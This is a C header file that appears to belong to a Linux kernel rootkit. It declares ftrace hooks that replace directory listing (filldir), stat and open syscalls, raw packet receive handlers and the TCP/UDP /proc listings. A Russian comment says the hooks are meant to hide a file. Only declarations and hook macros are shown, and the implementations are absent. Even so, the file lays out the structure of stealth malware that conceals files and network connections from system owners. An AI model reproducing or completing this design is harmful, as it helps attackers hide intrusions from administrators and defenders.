#ifndef HOOKS_H
#define HOOKS_H

#include <linux/types.h>
#include <linux/dirent.h>       // struct linux_dirent64
#include <linux/sched.h>        // struct task_struct
#include <linux/fdtable.h>      // struct files_struct, struct fdtable
#include <linux/fs.h>           // struct file, struct inode, struct super_block, struct file_system_type
#include <linux/dcache.h>       // struct dentry
#include <linux/limits.h>       // PATH_MAX


#include <linux/delay.h>		// msleep

#include <net/inet_sock.h>				// struct inet_sock
#include <linux/inet.h>					// in4_pton()
#include <linux/ipv6.h> 				// inet6_sk()
#include <uapi/linux/uio.h>				// struct iovec
#include <uapi/linux/netlink.h>			// struct nlmsghdr
#include <uapi/linux/inet_diag.h>		// struct inet_diag_msg
#include <uapi/linux/sock_diag.h> 		// SOCK_DIAG_BY_FAMILY
#include <linux/socket.h>				// struct user_msghdr

#include <linux/ip.h>				// ip_hdr()
#include <linux/ipv6.h>				// ipv6_hdr()

#include <linux/ftrace.h>

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

struct Extended_array {
    void *array_addr;
    int array_size;
};


// ------------------------------- filldir ----------------------------------------
extern bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);

extern bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
bool ex_filldir(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);


// extern asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
// extern asmlinkage long ex_sys_getdents64(struct pt_regs *regs);
// --------------------------------------------------------------------------------

// ------------------------------- stat -------------------------------------------
extern asmlinkage long (*real_sys_stat)(struct pt_regs *regs);
asmlinkage long ex_sys_stat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_lstat)(struct pt_regs *regs);
asmlinkage long ex_sys_lstat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_newstat)(struct pt_regs *regs);
asmlinkage long ex_sys_newstat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs);
asmlinkage long ex_sys_newlstat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs);
asmlinkage long ex_sys_newfstatat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_statx)(struct pt_regs *regs);
asmlinkage long ex_sys_statx(struct pt_regs *regs);
// --------------------------------------------------------------------------------

// ------------------------------- open -------------------------------------------
// не до конца сделано. надо изменять название скрываемого файла
extern asmlinkage long (*real_sys_open)(struct pt_regs *regs);
asmlinkage long ex_sys_open(struct pt_regs *regs);

extern asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
asmlinkage long ex_sys_openat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_openat2)(struct pt_regs *regs);
asmlinkage long ex_sys_openat2(struct pt_regs *regs);
// --------------------------------------------------------------------------------


// --------------------------------------------------------------------------------
// подключения
// extern asmlinkage long (*real_sys_recvfrom)(struct pt_regs *regs);
// extern asmlinkage long ex_sys_recvfrom(struct pt_regs *regs);

// extern asmlinkage long (*real_sys_recvmsg)(struct pt_regs *regs);
// extern asmlinkage long ex_sys_recvmsg(struct pt_regs *regs);

// --------------------------------------------------------------------------------

// ------------------------------- socket -----------------------------------------
// packet_rcv packet_rcv_spkt tpacket_rcv linux-source-6.11/net/packet/af_packet.c
// struct sk_buff - linux-headers-6.11.2-common/include/linux/skbuff.h

extern int (*real_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
int ex_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

extern int (*real_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
int ex_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

extern int (*real_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
int ex_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);

extern asmlinkage long (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_tcp6_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_udp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v);

extern asmlinkage long (*real_udp6_seq_show)(struct seq_file *seq, void *v);
asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v);
// --------------------------------------------------------------------------------

#define SYSCALL_NAME(name) ("__x64_" name)

#define SYS_HOOK(_name, _function, _original)	\
	{					\
		.name = SYSCALL_NAME(_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

#define HOOK(_name, _function, _original)	\
	{					\
		.name = (_name),	\
		.function = (_function),	\
		.original = (_original),	\
	}

#endif
